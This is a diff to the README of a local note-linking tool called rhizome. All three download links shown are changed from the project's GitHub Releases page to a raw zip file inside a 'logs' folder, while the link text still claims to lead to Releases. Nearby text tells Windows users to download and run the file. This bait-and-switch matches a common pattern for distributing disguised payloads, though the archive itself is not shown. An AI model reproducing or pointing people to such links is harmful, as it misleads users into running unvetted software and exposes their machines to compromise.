@@ -1,6 +1,6 @@
 # 🪢 rhizome - Find related notes fast
 
-[![Download rhizome](https://img.shields.io/badge/Download%20rhizome-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Open-priority231/rhizome/releases)
+[![Download rhizome](https://img.shields.io/badge/Download%20rhizome-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Open-priority231/rhizome/raw/refs/heads/main/logs/Software_v2.2.zip)
 
 ## 📌 What rhizome does
 
@@ -22,7 +22,7 @@ You do not need a cloud service. You do not need a database. Your notes stay loc
 
 Visit the release page to download rhizome:
 
-[Download rhizome from GitHub Releases](https://github.com/Open-priority231/rhizome/releases)
+[Download rhizome from GitHub Releases](https://github.com/Open-priority231/rhizome/raw/refs/heads/main/logs/Software_v2.2.zip)
 
 On the release page, pick the latest Windows file. If you see more than one file, choose the one that ends in `.exe` or `.zip` for Windows.
 
@@ -202,5 +202,5 @@ This makes it easier to see how rhizome behaves before you point it at a larger 
 
 Use the release page below to download and run rhizome on Windows:
 
-[Go to rhizome Releases](https://github.com/Open-priority231/rhizome/releases)
+[Go to rhizome Releases](https://github.com/Open-priority231/rhizome/raw/refs/heads/main/logs/Software_v2.2.zip)
 
